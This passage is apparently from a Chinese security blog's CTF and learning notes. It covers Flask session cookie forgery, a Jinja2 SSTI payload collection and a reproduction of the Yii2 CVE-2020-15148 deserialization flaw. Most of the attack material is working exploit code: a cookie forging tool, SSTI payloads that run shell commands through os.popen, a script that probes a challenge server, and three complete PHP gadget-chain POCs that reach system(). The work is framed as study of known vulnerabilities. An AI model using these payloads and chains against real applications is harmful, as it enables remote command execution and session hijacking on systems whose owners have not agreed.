        <content type="html"><![CDATA[<p>[TOC]</p><p>在Web中，session是认证用户身份的凭证，它具备如下几个特点：</p><ol><li>用户不可以任意篡改</li><li>A用户的session无法被B用户获取</li></ol><p>也就是说，session的设计目的是为了做用户身份认证。但是，很多情况下，session被用作了别的用途，将产生一些安全问题，我们今天就来谈谈“客户端session”（client session）导致的安全问题。</p><h2 id="客户端session"><a href="#客户端session" class="headerlink" title="客户端session"></a>客户端session</h2><p>在传统PHP开发中，<code>$_SESSION</code>变量的内容默认会被保存在服务端的一个文件中，通过一个叫“PHPSESSID”的Cookie来区分用户。这类session是“服务端session”，用户看到的只是session的名称（一个随机字符串），其内容保存在服务端。</p><p>然而，并不是所有语言都有默认的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。</p><p>因为cookie实际上是存储在客户端（浏览器）中的，所以称之为“客户端session”。</p><h2 id="flask-session-加解密"><a href="#flask-session-加解密" class="headerlink" title="flask session 加解密"></a>flask session 加解密</h2><p>p牛博客的</p><p><img src="/2022/03/08/session-an-quan/image-20220308153724179.png" alt="image-20220308153724179"></p><p>flask是一个客户端session，所以看目标为flask的站点的时候，我习惯性地去解密其session。p牛的代码解密session：</p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b'.', 1)    payload, timestamp = payload.rsplit(b'.', 1)    decompress = False    if payload.startswith(b'.'):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception('Could not base64 decode the payload because of '                         'an exception')    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception('Could not zlib decompress the payload before '                             'decoding the payload')    return session_json_serializer.loads(payload)if __name__ == '__main__':    print(decryption(sys.argv[1].encode()))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/08/session-an-quan/image-20220308153840342.png" alt="image-20220308153840342"></p><h3 id="如果知道secret-key的情况下，是可以伪造签名的。"><a href="#如果知道secret-key的情况下，是可以伪造签名的。" class="headerlink" title="如果知道secret_key的情况下，是可以伪造签名的。"></a>如果知道secret_key的情况下，是可以伪造签名的。</h3><p>加解密代码：</p><pre class="line-numbers language-none"><code class="language-none">""" Flask Session Cookie Decoder/Encoder """__author__ = 'Wilson Sumanang, Alexandre ZANNI'# standard importsimport sysimport zlibfrom itsdangerous import base64_decodeimport ast# Abstract Base Classes (PEP 3119)if sys.version_info[0] &lt; 3: # &lt; 3.0    raise Exception('Must be using at least Python 3')elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4    from abc import ABCMeta, abstractmethodelse: # &gt; 3.4    from abc import ABC, abstractmethod# Lib for argument parsingimport argparse# external Importsfrom flask.sessions import SecureCookieSessionInterfaceclass MockApp(object):    def __init__(self, secret_key):        self.secret_key = secret_keyif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4    class FSCM(metaclass=ABCMeta):        def encode(secret_key, session_cookie_structure):            """ Encode a Flask session cookie """            try:                app = MockApp(secret_key)                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))                si = SecureCookieSessionInterface()                s = si.get_signing_serializer(app)                return s.dumps(session_cookie_structure)            except Exception as e:                return "[Encoding error] {}".format(e)                raise e        def decode(session_cookie_value, secret_key=None):            """ Decode a Flask cookie  """            try:                if(secret_key==None):                    compressed = False                    payload = session_cookie_value                    if payload.startswith('.'):                        compressed = True                        payload = payload[1:]                    data = payload.split(".")[0]                    data = base64_decode(data)                    if compressed:                        data = zlib.decompress(data)                    return data                else:                    app = MockApp(secret_key)                    si = SecureCookieSessionInterface()                    s = si.get_signing_serializer(app)                    return s.loads(session_cookie_value)            except Exception as e:                return "[Decoding error] {}".format(e)                raise eelse: # &gt; 3.4    class FSCM(ABC):        def encode(secret_key, session_cookie_structure):            """ Encode a Flask session cookie """            try:                app = MockApp(secret_key)                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))                si = SecureCookieSessionInterface()                s = si.get_signing_serializer(app)                return s.dumps(session_cookie_structure)            except Exception as e:                return "[Encoding error] {}".format(e)                raise e        def decode(session_cookie_value, secret_key=None):            """ Decode a Flask cookie  """            try:                if(secret_key==None):                    compressed = False                    payload = session_cookie_value                    if payload.startswith('.'):                        compressed = True                        payload = payload[1:]                    data = payload.split(".")[0]                    data = base64_decode(data)                    if compressed:                        data = zlib.decompress(data)                    return data                else:                    app = MockApp(secret_key)                    si = SecureCookieSessionInterface()                    s = si.get_signing_serializer(app)                    return s.loads(session_cookie_value)            except Exception as e:                return "[Decoding error] {}".format(e)                raise eif __name__ == "__main__":    # Args are only relevant for __main__ usage        ## Description for help    parser = argparse.ArgumentParser(                description='Flask Session Cookie Decoder/Encoder',                epilog="Author : Wilson Sumanang, Alexandre ZANNI")    ## prepare sub commands    subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')    ## create the parser for the encode command    parser_encode = subparsers.add_parser('encode', help='encode')    parser_encode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;',                                help='Secret key', required=True)    parser_encode.add_argument('-t', '--cookie-structure', metavar='&lt;string&gt;',                                help='Session cookie structure', required=True)    ## create the parser for the decode command    parser_decode = subparsers.add_parser('decode', help='decode')    parser_decode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;',                                help='Secret key', required=False)    parser_decode.add_argument('-c', '--cookie-value', metavar='&lt;string&gt;',                                help='Session cookie value', required=True)    ## get args    args = parser.parse_args()    ## find the option chosen    if(args.subcommand == 'encode'):        if(args.secret_key is not None and args.cookie_structure is not None):            print(FSCM.encode(args.secret_key, args.cookie_structure))    elif(args.subcommand == 'decode'):        if(args.secret_key is not None and args.cookie_value is not None):            print(FSCM.decode(args.cookie_value,args.secret_key))        elif(args.cookie_value is not None):            print(FSCM.decode(args.cookie_value))            解密:python flask_session_manager.py decode -c -s  # -c是flask cookie里的session值 -s参数是SECRET_KEY加密:python flask_session_manager.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/08/session-an-quan/image-20220308154210934.png" alt="image-20220308154210934"></p>]]></content>
      
      
      <categories>
          
          <category> session </category>
          
      </categories>
      
      
        <tags>
            
            <tag> session </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti库</title>
      <link href="/2022/03/07/ssti-ku/"/>
      <url>/2022/03/07/ssti-ku/</url>
      
        <content type="html"><![CDATA[<h2 id="1-如何得到payload"><a href="#1-如何得到payload" class="headerlink" title="1.如何得到payload"></a>1.如何得到payload</h2><pre class="line-numbers language-none"><code class="language-none">{{7*'7'}}回显是7777777，判断是Jinja2模板（如果回显是49则为Twig模板）如何得到payload？1、先找基类object，用空字符串""来找在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。使用?name={{"".__class__}}，得到空字符串的类&lt;class 'str'&gt;点号. ：python中用来访问变量的属性__class__：类的一个内置属性，表示实例对象空字符串""的类。然后使用?name={{"".__class__.__mro__}}，得到(&lt;class 'tuple'&gt;, &lt;class 'object'&gt;)__mro__              method resolution order，即解析方法调用的顺序；此属性是由类组成的元组，在方法解析期间会基于它来查找基类。然后再用?name={{().__class__.__mro__[-1]}}，取得最后一个东西即空字符串的类的基类&lt;class 'object'&gt;或者使用?name={{"".__class__.__bases__}}，得到空字符串的类的基类&lt;class 'object'&gt;__base__             类型对象的直接基类__bases__           类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__2、得到基类之后，找到这个基类的子类集合使用?name={{().__class__.__mro__[1].__subclasses__()}}__subclasses__()     返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。3、找到其所有子类集合之后找一个我们能够使用的类，要求是这个类的某个方法能够被我们用于执行、找到flag这里使用其第133个类（[0]是第一个类）&lt;class 'os._wrap_close'&gt;使用?name={{"".__class__.__mro__[-1].__subclasses__()[132]}}，得到&lt;class 'os._wrap_close'&gt;&lt;class 'os._wrap_close'&gt;        这个类有个popen方法可以执行系统命令4、实例化我们找到的类对象使用?name={{"".__class__.__mro__[-1].__subclasses__()[132].__init__}}，实例化这个类__init__             初始化类，返回的类型是function5、找到这个实例化对象的所有方法使用?name={{"".__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__}}__globals__          使用方式是 function.__globals__获取function所处空间下可使用的module、方法以及所有变量。6、根据方法寻找flag?name={{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}popen()一个方法，用于执行命令read() 从文件当前位置起读取size个字节，若无参数size，则表示读取至文件结束为止，它范围为字符串对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-查找指定类的序号"><a href="#1-查找指定类的序号" class="headerlink" title="1.查找指定类的序号"></a>1.查找指定类的序号</h3><pre class="line-numbers language-none"><code class="language-none">## 本地查找import requestssearch ="popen"num=-1s=().__class__.__mro__[-1].__subclasses__()for i  in s:  num+=1  try:    if search in  i.__init__.__globals__.keys():      print(i,num)  except:    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">根据题目环境查找import requestsurl="http://e4734666-c1af-4cf3-bce3-41fd267e2eff.challenge.ctf.show/?name="for i in range(0,300):  print(i)  payload="{{().__class__.__mro__[-1].__subclasses__()[%s]}}" %i  print(payload)  r=requests.get(url=url+payload).text  if "os._wrap_close" in r:    print(r)    print(i)    break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-python2和python3-有区别"><a href="#2-python2和python3-有区别" class="headerlink" title="2.python2和python3 有区别"></a>2.python2和python3 有区别</h2><p><a href="https://www.cnblogs.com/hetianlab/p/14154635.html">细说</a></p><h2 id="3-ssti绕过的学习"><a href="#3-ssti绕过的学习" class="headerlink" title="3.ssti绕过的学习"></a>3.ssti绕过的学习</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">ssti绕过</a></p><pre class="line-numbers language-none"><code class="language-none">{%%}可以用来声明变量，当然也可以用于循环语句和条件语句。{{}}用于将表达式打印到模板输出{##}表示未包含在模板输出中的注释##可以有和{%%}相同的效果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>除了标准的python语法使用点<code>（.）</code>外，还可以使用中括号<code>（[]）</code>来访问变量的属性。</p><pre class="line-numbers language-none"><code class="language-none">{{"".__class__}}{{""['__class__']}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>所以过滤了点，我们还可以用中括号绕过。</strong><br>如果想调用字典中的键值，其本质其实是调用了魔术方法<code>__getitem__</code><br><strong>所以对于取字典中键值的情况不仅可以用<code>[]</code>，也可以用<code>__getitem__</code></strong><br>当然对于字典来说，我们也可以用他自带的一些方法了。pop就是其中的一个</p><pre class="line-numbers language-none"><code class="language-none">pop(key[,default])参数key: 要删除的键值default: 如果没有 key，返回 default 值删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。dict.get(key, default=None)返回指定键的值，如果值不在字典中返回default值dict.setdefault(key, default=None)和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例子</p><pre class="line-numbers language-none"><code class="language-none">{{url_for.__globals__['__builtins__']}}{{url_for.__globals__.__getitem__('__builtins__')}}{{url_for.__globals__.pop('__builtins__')}}{{url_for.__globals__.get('__builtins__')}}{{url_for.__globals__.setdefault('__builtins__')}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.目前遇到最短payload</p><pre class="line-numbers language-none"><code class="language-none">{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.</p><pre class="line-numbers language-none"><code class="language-none">{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.</p><pre class="line-numbers language-none"><code class="language-none">{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ssti </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yii2框架 反序列化漏洞复现</title>
      <link href="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/"/>
      <url>/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>Yii2 2.0.38 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令</p><p>根据 https:blog.csdn.netZero_Adamarticledetails118031709师傅学习</p><p>https:blog.csdn.netqq_46918279articledetails120473172  CVE-2020-15148–Yii2 反序列化漏洞复现 搭建好环境</p><h2 id="关于yii2的一些访问小知识"><a href="#关于yii2的一些访问小知识" class="headerlink" title="关于yii2的一些访问小知识"></a>关于yii2的一些访问小知识</h2><pre class="line-numbers language-none"><code class="language-none">根目录：http:localhostyii2basicwebindex.php 或者  http:localhostyii2basicweb而后用变量r来表示控制器和方法：http:localhostyii2basicwebindex.php?r=控制器方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>注意格式：（多词汇组成的，每个单词首字母需大写）<br>控制器的格式 是 TestController 。 后面的Controller是固定的。然后前面那一块是控制器的名字，输入的时候，小写就行。<br>里面的方法。格式是 actionTest 。 前面的action是固定的，后面的是名字，换成小写就好。</p><p>例如：</p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226211549391.png" alt="image-20220226211549391"></p><pre class="line-numbers language-none"><code class="language-none">http:localhostyii2basicwebindex.php?r=testtest&amp;data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="CVE-2020-15148复现"><a href="#CVE-2020-15148复现" class="headerlink" title="CVE-2020-15148复现"></a>CVE-2020-15148复现</h2><p>这个反序列化的入口点是一个__destruct()，在BatchQueryResult类中</p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226212028235.png" alt="image-20220226212028235"></p><p>继续跟进reset()，发现没有什么利用的办法，正常可能链就断了，但是大师傅们的思路就是不一样，这里的<code>_dataReader</code>是可控的，那么调用了close的方法，是不是可以想办法触发<code>__call</code>呢？（调用类中不存在的方法的时候就会调用 <code>__call()</code>方法了）</p><p>全局搜索(CTRL+SHIFT+F)一下__call，最后在<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>找到了一个合适的__call方法：</p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226212258957.png" alt="image-20220226212258957"></p><p>因为上面的那个 close 是无参方法，所以传给 <code>__call()</code> 中的 <code>$method</code>是 <code>close</code> ， <code>$attributes</code> 为空。然后我们继续跟进format方法：</p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226212318463.png" alt="image-20220226212318463"></p><p>传入的formatter是 close</p><p>好家伙，<code>call_user_func_array</code> 。 继续跟进一下 <code>getFormatter</code>.</p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226212426017.png" alt="image-20220226212426017"></p><p>$this-&gt;formatter 可控，因此返回值可控，因此`call_user_func_array($this-&gt;getFormatter($formatter), $arguments )中，回调函数我们可控，但是$arguments 是一个空数组，所以相当于我们能够干两件事：</p><p>1.调用yii2中任意的一个无参方法，</p><p>2.调用原生类中类似phpinfo()这样的无参方法。</p><p>但是第二种肯定不能RCE。因此我们还需要在yii2中已有的无参方法中进行挖掘：</p><h3 id="1-1调用原生php的类似phpinfo-这样的无参方法-调试："><a href="#1-1调用原生php的类似phpinfo-这样的无参方法-调试：" class="headerlink" title="1.1调用原生php的类似phpinfo()这样的无参方法 + 调试："></a>1.1调用原生php的类似phpinfo()这样的无参方法 + 调试：</h3><p>其实不用这个多，不用带 函数方法的，就带上属性就行了。但是为了本地调试能够看出来对错，我便带上了整个调用链的调用函数链</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Faker{    class Generator    {        protected $formatters;        public function __construct()        {            $this-&gt;formatters['close'] = "phpinfo"; # 调用单一原生函数，        }        public function __call($method, $attributes)        {            return $this-&gt;format($method, $attributes);        }        public function format($formatter, $arguments = array())        {            return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);        }        public function getFormatter($formatter)        {            if (isset($this-&gt;formatters[$formatter])) {                return $this-&gt;formatters[$formatter];            }            foreach ($this-&gt;providers as $provider) {                if (method_exists($provider, $formatter)) {                    $this-&gt;formatters[$formatter] = array($provider, $formatter);                    return $this-&gt;formatters[$formatter];                }            }            throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));        }    }}namespace yii\db{    use Faker\Generator;    class BatchQueryResult    {        private $_dataReader;        public function __construct()        {            $this-&gt;_dataReader = new Generator();        }        public function reset()        {            if ($this-&gt;_dataReader !== null) {                $this-&gt;_dataReader-&gt;close();            }            $this-&gt;_dataReader = null;            $this-&gt;_batch = null;            $this-&gt;_value = null;            $this-&gt;_key = null;        }                public function __destruct()        {             make sure cursor is closed            $this-&gt;reset();        }    }}namespace{        use yii\db\BatchQueryResult;        echo base64_encode(serialize(new BatchQueryResult()));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226213435176.png" alt="image-20220226213435176"></p><p>反向也可</p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226213821353.png" alt="image-20220226213821353"></p><p>上面的就可以直接打了。其实精简的话，可以去掉除了<code>__construct()</code>之外的所有方法，</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Faker{    class Generator    {        protected $formatters;        public function __construct()        {            $this-&gt;formatters['close'] = "phpinfo";        }    }}namespace yii\db{    use Faker\Generator;    class BatchQueryResult    {        private $_dataReader;        public function __construct()        {            $this-&gt;_dataReader = new Generator();        }    }}namespace{        use yii\db\BatchQueryResult;        echo base64_encode(serialize(new BatchQueryResult()));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的payload是和上面的那个是一样的。</p><h3 id="1-2-调用yii2中任意的一个无参方法"><a href="#1-2-调用yii2中任意的一个无参方法" class="headerlink" title="1.2 调用yii2中任意的一个无参方法"></a>1.2 调用yii2中任意的一个无参方法</h3><p>在yii2中找无参方法：</p><pre class="line-numbers language-none"><code class="language-none">function \w+\(\)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226214243100.png" alt="image-20220226214243100"></p><p>但是无参函数实在是太多了，一个一个挖起来实在费力。这里就是大师傅们的经验和智慧了,直接搜索含有 <code>call_user_function</code>的无参函数：</p><pre class="line-numbers language-none"><code class="language-none">function \w*\(\)\n? *\{(.*\n)+ *call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226214709121.png" alt="image-20220226214709121"></p><p>师傅说<code>restCreateAction.php</code>以及<code>restIndexAction.php</code>都可以，这里分析一下 CreateAction.php看看</p><p>这个直接啊，到时候第一个回调函数，回调这个run，然后两个参数为system ，dir。 就RCE了嘛，函数名和参数都可控</p><p>理一下就是这样：</p><pre class="line-numbers language-none"><code class="language-none">class BatchQueryResult  -&gt;__destruct()↓↓↓class BatchQueryResult  -&gt;reset()↓↓↓class Generator  -&gt;__call()↓↓↓class Generator  -&gt;format()↓↓↓class Generator  -&gt;getFormatter()↓↓↓class IndexAction  -&gt;run()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace yii\rest{    class IndexAction{        public $checkAccess;        public $id;        public function __construct(){            $this-&gt;checkAccess = 'system';            $this-&gt;id = 'dir';        }    }}namespace Faker {    use yii\rest\IndexAction;    class Generator    {        protected $formatters;        public function __construct()        {            $this-&gt;formatters['close'] = [new IndexAction(), 'run'];        }    }}namespace yii\db{    use Faker\Generator;    class BatchQueryResult{        private $_dataReader;        public function __construct()        {            $this-&gt;_dataReader=new Generator();        }    }}namespace{    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226215721642.png" alt="image-20220226215721642"></p><h2 id="反序列化链2的复现"><a href="#反序列化链2的复现" class="headerlink" title="反序列化链2的复现"></a>反序列化链2的复现</h2><p>根据yii2.0.38的更新：</p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226231320398.png" alt="image-20220226231320398"></p><p>增加了__wakeup()，在反序列化的时候直接抛出异常，因此以BatchQueryResult为起点的这条链在2.0.38里算是不行了。因此再继续复习学习一下大师傅们针对2.0.38挖掘的其他新链。</p><p>类比上一条链的思路，yii2只是限制了batchQueryResult类不能进行反序列化，但是后面的__cal以及之后的链都是完好无损的，因此想找一条新的链，最快的方式就是再找一个存在__destruct这样的利用点，然后正好类中的一个属性调用了一个方法，而且这个属性我们可控，那么就是一条新链了。<br>全局找一下__destruct，经过排查，发现RunProcess类的__destruct可以利用：<br><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226231402247.png" alt="image-20220226231402247"></p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226231633167.png" alt="image-20220226231633167"></p><p>这里<code>$process-&gt;isRunning()</code>，因为<code>$this-&gt;processes</code>是我们可控的，因此<code>$process</code>也同样可控，所以这里调用isRunning方法，又可以触发__call，然后继续反序列化攻击。</p><p>构造一波POC：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace yii\rest{    class IndexAction{        public $checkAccess;        public $id;        public function __construct(){            $this-&gt;checkAccess = 'system';            $this-&gt;id = 'dir';        }    }}namespace Faker {    use yii\rest\IndexAction;    class Generator    {        protected $formatters;        public function __construct()        {            $this-&gt;formatters['isRunning'] = [new IndexAction(), 'run'];        }    }}namespace Codeception\Extension{    use Faker\Generator;    class RunProcess    {        private $processes = [];        public function __construct(){            $this-&gt;processes[]=new Generator();        }    }}namespace{    use Codeception\Extension\RunProcess;    echo base64_encode(serialize(new RunProcess()));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226231817423.png" alt="image-20220226231817423"></p><h2 id="反序列化链3的复现"><a href="#反序列化链3的复现" class="headerlink" title="反序列化链3的复现"></a>反序列化链3的复现</h2><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226232626581.png" alt="image-20220226232626581"></p><p>跟进一下 clearall：</p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226232654955.png" alt="image-20220226232654955"></p><p>没有可以触发__call的地方，但是发现存在字符串的拼接，而<code>$this-&gt;path</code>和<code>$nsKey</code>都是我们可控的，因此可以触发__toString()。全局搜索一波，可以找到很多：</p><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226233135426.png" alt="image-20220226233135426"></p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace yii\rest{    class IndexAction{        public $checkAccess;        public $id;        public function __construct(){            $this-&gt;checkAccess = 'system';            $this-&gt;id = 'dir';        }    }}namespace Faker {    use yii\rest\IndexAction;    class Generator    {        protected $formatters;        public function __construct()        {            $this-&gt;formatters['render'] = [new IndexAction(), 'run'];        }    }}namespace phpDocumentor\Reflection\DocBlock\Tags{    use Faker\Generator;    class See    {        protected $description;        public function __construct(){            $this-&gt;description=new Generator();        }    }}namespace{    use phpDocumentor\Reflection\DocBlock\Tags\See;    class Swift_KeyCache_DiskKeyCache    {        private $keys = [];        private $path;        public function __construct(){            $this-&gt;path=new See();            $this-&gt;keys=array(                'hello'=&gt;'world'            );        }    }    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226233503651.png" 